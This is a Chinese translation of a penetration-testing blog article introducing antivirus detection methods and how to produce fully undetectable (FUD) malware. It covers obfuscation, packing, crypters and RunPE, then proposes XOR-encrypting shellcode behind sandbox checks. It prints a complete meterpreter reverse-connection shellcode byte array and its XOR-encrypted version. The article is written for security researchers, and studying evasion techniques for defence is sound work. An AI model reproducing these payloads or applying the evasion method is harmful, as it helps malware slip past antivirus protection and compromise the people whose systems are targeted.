原文地址: https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/
**译者：[MyKings@知道创宇404实验室](http://mykings.me/2016/12/16/%E5%8F%8D%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%8F%8D%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B/)**
本文将讲解绕过静态、动态、启发式分析等最新的防病毒产品检测的方法，有些方法已经众所知，但是还有一些方法和实现技巧可以来生成
`FUD`(对所有杀毒软件都免杀)恶意软件。
恶意软件的大小差不多和反检测一样重要，当达到免杀时我会尽量减小它的体积。 本文还讲解了反毒软件和 `Windows`
操作系统内部的底层工作原理，阅读者应该至少具有 C/C++、汇编知识的一种，并对 `PE` 文件结构有一定的了解。
## 1\. 基本介绍
实现反检测技术应针对每种恶意软件类型做不同的处理，本文中讲解的所有方法将适用于所有类型的恶意软件。
但本文主要集中在 `meterpreter` 这种 payload 上，因为 `meterpreter` 能做所有其他恶意软件做的事情，例如:
提权、凭证窃取、进程迁移、注册表操作和分配更多的后续攻击，`meterpreter` 还有一个非常活跃的社区，并且它在安全研究人员中非常流行。
> _`译者注:`_
>
>   1. 恶意软件分类:病毒、木马、僵尸程序、流氓软件、勒索软件、广告程序等
> 
>
>   2. Meterpreter 是一种高级可动态扩展的有效负载，它使用内存中的 DLL 注入 stager，并在运行时通过网络扩展。
> 
>
>
## 2\. 专业术语
### 2.1 基于签名检测
传统的防病毒软件很大程度上依赖于签名来识别恶意软件。
基本上当恶意软件样本到达防病毒公司手中时，它由恶意软件研究人员或动态分析系统分析。然后，一旦确定是恶意软件，则提取文件的适当签名并将其添加到反病毒软件的签名数据库中。[1]
### 2.2 静态程序分析
静态程序分析是在不实际运行程序的情况下进行软件的分析。
在大多数情况下，分析是对某些版本的源代码进行的。而在其他情况下，是某种形式的目标代码(`译者注: 如二进制文件, 需要进行逆向反汇编操作` )。[2]
### 2.3 动态程序分析
动态程序分析是通过在真实或虚拟处理器上执行程序而进行的计算机软件的分析。 为了使动态程序分析有效，目标程序必须执行足够的测试输入以产生有趣的行为(如:
异常退出)。[3]
### 2.4 沙箱技术
在计算机安全中，沙箱是用于隔离正在运行的程序的安全机制。
它通常用于执行未经测试或不受信任的程序或代码，这个程序代码可能来自未经验证的或不受信任的第三方、供应商、用户或网站，而不会危害主机或操作系统。[4]
### 2.5 启发式分析
启发式分析是许多计算机防病毒软件使用的一种方法，其被设计用于检测未知的计算机病毒，以及新的病毒变体。
启发式分析是基于专家的分析，其确定系统对特定威胁/风险使用各种决策规则或衡量方法。 多标准分析（MCA）是衡量的手段之一。
这种方法不同于统计分析，其基于可用的数据/统计。[5]
### 2.6 信息熵
在计算中，熵是由操作系统或应用收集的用于在密码学或需要随机数据的其他用途中使用的随机性。
这种随机性通常从硬件源收集，例如鼠标移动或专门提供的随机发生器。 缺乏熵可能对性能和安全性产生负面影响。[6]
## 3 常见技术
当涉及到减少恶意软件被检测到的风险时，我们首先考虑到的是加密、加壳和代码混淆。
当然这些工具和技术仍然能够绕过大量的 `AV` 产品，但是由于网络安全领域的不断进步，大部分流行的工具和方法已经逐步过时，不能够创造出
FUD(免杀的)恶意软件。
为了理解这些技术和工具的内部原理，我会给出简要的描述;
### 3.1 混淆
代码混淆可以被定义为混合二进制的源代码而不破坏真实函数，它使得静态分析更困难，并且还改变二进制的散列签名。
可以通过添加几行垃圾代码或以编程方式更改指令的执行顺序来实现混淆。 这种方法可以绕过良好的 `AV` 产品，但它的效果取决于你混淆的次数。
### 3.2 加壳
加壳将可执行文件进行压缩打包, 并将压缩数据与解压缩代码组合成单个可执行文件的一种手段。
当执行被压缩过的可执行文件时，解压缩代码会在执行之前从压缩数据中重新创建原始代码。
在大多数情况下这个操作是透明的，所以压缩过的可执行文与原始程序一样可以正常运行。当 `AV` 扫描器扫描压缩过的恶意软件时，它需要知道压缩算法并将其解压缩。
因为压缩过的文件更难分析, 所以恶意软件一般都会被压缩加壳等。
### 3.3 加密
加密是对给定的二进制程序进行加密，使其难以分析或被逆向。 加密存在两个部分: 一个构建器，一个存根。构建器只是加密给定的二进制在 stub
内的位置，stub 是该加密的最重要的部分，当我们的二进制执行，第一 stub 运行和解密原始二进制到存储器，然后通过 `"RunPE"`
方法（在大多数情况下）对存储器执行 binary。
## 4 加壳与加密的问题
在开始之前，我们需要知道主流技术和工具中有哪些错误。 今天的 `AV`
公司已经意识到了危险，他们现在不仅仅是对恶意软件签名和有害行为分析，还能够识别加壳与加密的痕迹。
与检测恶意软件相比，检测加密和加壳是相对容易的，因为他们都有某些可疑的行为，如: 解密加密过的 `PE` 文件，并在内存上执行它。
### 4.1 PE 注入
为了完全理解 `PE` 映像在内存执行情况, 我们需要先谈论下 `Windows` 中如何加载 `PE` 文件。 通常，当编译 `PE`
文件时，编译器将主模块地址设置为 `0x00400000`，同时根据主模块地址计算编译过程中所有完整地址指针和地址的长跳转指令，在编译过程结束时编译器在
`PE` 文件中创建一个重定位分区表，重定位分区表包含映像基地址的指令地址，诸如完整地址指针和长跳转指令。
在执行 `PE` 映像时，操作系统检查 `PE` 映像的首选地址空间是否可用，如果首选地址空间不可用，则操作系统将 `PE`
映像随机加载到一个可用的内存地址上，在启动进程之前系统加载程序需要调整内存上的绝对地址，在重定位分区系统加载器的帮助下修正所有地址相关指令并启动挂起的进程。
所有这种机制称为 “`地址布局随机化(ASLR)`”。[7]
为了让内存中的密码器执行 `PE` 映像，需要解析 `PE` 报头并重新定位绝对地址。几乎在我们对每一种用 `C`
或更高级语言编写的加密程序分析时，我们经常可以看到 “`NtUnmapViewOfSection`”、 “`ZwUnmapViewOfSection`”
这些 Windows API 函数接口的调用，这些函数简单地从主体进程的虚拟地址空间中取消映射一个分区视图，它们在内存执行方法调用中 `RunPE`
扮演了非常重要的角色几乎使用了90％。
    xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
    xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
当然，`AV` 产品不能仅仅因为程序使用了这些 Windows API 函数，就认为每个程序都是恶意的，但使用这些函数的顺序很重要。 有小部分的
`crypters`（大多数写在汇编）不使用这些功能和手动执行重定位，他们是有时效性的，使用 `crypters`
不合算，因为在逻辑上没有无害的程序会尝试模仿系统的加载程序。
另一个缺点是输入文件的巨大熵增加，因为加密整个 `PE` 文件，熵将不可避免地上升，当 `AV` 扫描程序检测到 `PE`
文件上的异常熵时，他们可能会将文件标记为可疑。
### 4.2 完美方法
加密恶意代码的概念是明智的，但是解密功能应当被正确地混淆，并且当涉及在内存中执行解密的代码时，我们必须在不重定位绝对地址的情况下进行，还必须有检测机制检查恶意软件是否在沙箱中被动态分析，如果检测机制检测到恶意软件正由
`AV` 分析，则不应执行解密功能。而不是加密整个 `PE` 文件，应当加密 `shellcode` 或只有 `.text`
节的二进制最佳，它保持熵和低体积，并且不更改图像头和节。
这是恶意软件流程图。
我们的 “AV检测” 功能将检测恶意软件是否正在沙箱中被动态分析，如果功能检测到AV扫描器的任何迹象，则它将再次调用主函数或者仅当 “AV Detect”
函数来用。如果没有发现AV扫描器的任何迹象，它会调用 “解密Shellcode” 的功能。
这是 `meterpreter` 反向连接 `shellcode` 的原始格式。
    unsigned char Shellcode[] = {
      0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
      0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
      0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
      0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
      0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
      0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
      0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
      0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
      0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
      0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
      0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
      0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77,
      0x73, 0x32, 0x5f, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0xb8,
      0x90, 0x01, 0x00, 0x00, 0x29, 0xc4, 0x54, 0x50, 0x68, 0x29, 0x80, 0x6b,
      0x00, 0xff, 0xd5, 0x6a, 0x05, 0x68, 0x7f, 0x00, 0x00, 0x01, 0x68, 0x02,
      0x00, 0x11, 0x5c, 0x89, 0xe6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40,
      0x50, 0x68, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x97, 0x6a, 0x10, 0x56,
      0x57, 0x68, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c,
      0xff, 0x4e, 0x08, 0x75, 0xec, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5,
      0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff,
      0xd5, 0x8b, 0x36, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x56, 0x6a,
      0x00, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53, 0x6a, 0x00,
      0x56, 0x53, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x01, 0xc3,
      0x29, 0xc6, 0x75, 0xee, 0xc3
    };
为了保持熵和体积大小在适当的值，我将这个 `shellcode` 传递给简单的 `xor` 密码与多字节 key，`xor` 不是像 `RC4` 或
`blowfish` 加密标准，但我们不需要一个强加密，AV产品不会尝试解密 `shellcode`，使其不可读和不可检测的静态字符串分析就足够了， 也使用
`xor` 进行解密过程更快更多，避免加密库在代码中将减少很多体积。
这是同一个 `meterpreter` 代码用 `XOR` 加密后。
    unsigned char Shellcode[] = {
      0xfb, 0xcd, 0x8d, 0x9e, 0xba, 0x42, 0xe1, 0x93, 0xe2, 0x14, 0xcf, 0xfa,
      0x31, 0x12, 0xb1, 0x91, 0x55, 0x29, 0x84, 0xcc, 0xae, 0xc9, 0xf3, 0x32,
      0x08, 0x92, 0x45, 0xb8, 0x8b, 0xbd, 0x2d, 0x26, 0x66, 0x59, 0x0d, 0xb2,
      0x9a, 0x83, 0x4e, 0x17, 0x06, 0xe2, 0xed, 0x6c, 0xe8, 0x15, 0x0a, 0x48,
      0x17, 0xae, 0x45, 0xa2, 0x31, 0x0e, 0x90, 0x62, 0xe4, 0x6d, 0x0e, 0x4f,
      0xeb, 0xc9, 0xd8, 0x3a, 0x06, 0xf6, 0x84, 0xd7, 0xa2, 0xa1, 0xbb, 0x53,
      0x8c, 0x11, 0x84, 0x9f, 0x6c, 0x73, 0x7e, 0xb6, 0xc6, 0xea, 0x02, 0x9f,
      0x7d, 0x7a, 0x61, 0x6f, 0xf1, 0x26, 0x72, 0x66, 0x81, 0x3f, 0xa5, 0x6f,
      0xe3, 0x7d, 0x84, 0xc6, 0x9e, 0x43, 0x52, 0x7c, 0x8c, 0x29, 0x44, 0x15,
      0xe2, 0x5e, 0x80, 0xc9, 0x8c, 0x21, 0x84, 0x9f, 0x6a, 0xcb, 0xc5, 0x3e,
      0x23, 0x7e, 0x54, 0xff, 0xe3, 0x18, 0xd0, 0xe5, 0xe7, 0x7a, 0x50, 0xc4,
      0x31, 0x50, 0x6a, 0x97, 0x5a, 0x4d, 0x3c, 0xac, 0xba, 0x42, 0xe9, 0x6d,
      0x74, 0x17, 0x50, 0xca, 0xd2, 0x0e, 0xf6, 0x3c, 0x00, 0xda, 0xda, 0x26,
      0x2a, 0x43, 0x81, 0x1a, 0x2e, 0xe1, 0x5b, 0xce, 0xd2, 0x6b, 0x01, 0x71,
      0x07, 0xda, 0xda, 0xf4, 0xbf, 0x2a, 0xfe, 0x1a, 0x07, 0x24, 0x67, 0x9c,
      0xba, 0x53, 0xdd, 0x93, 0xe1, 0x75, 0x5f, 0xce, 0xea, 0x02, 0xd1, 0x5a,
      0x57, 0x4d, 0xe5, 0x91, 0x65, 0xa2, 0x7e, 0xcf, 0x90, 0x4f, 0x1f, 0xc8,
      0xed, 0x2a, 0x18, 0xbf, 0x73, 0x44, 0xf0, 0x4b, 0x3f, 0x82, 0xf5, 0x16,
      0xf8, 0x6b, 0x07, 0xeb, 0x56, 0x2a, 0x71, 0xaf, 0xa5, 0x73, 0xf0, 0x4b,
      0xd0, 0x42, 0xeb, 0x1e, 0x51, 0x72, 0x67, 0x9c, 0x63, 0x8a, 0xde, 0xe5,
      0xd2, 0xae, 0x39, 0xf4, 0xfa, 0x2a, 0x81, 0x0a, 0x07, 0x25, 0x59, 0xf4,
      0xba, 0x2a, 0xd9, 0xbe, 0x54, 0xc0, 0xf0, 0x4b, 0x29, 0x11, 0xeb, 0x1a,
      0x51, 0x76, 0x58, 0xf6, 0xb8, 0x9b, 0x49, 0x45, 0xf8, 0xf0, 0x0e, 0x5d,
      0x93, 0x84, 0xf4, 0xf4, 0xc4
    };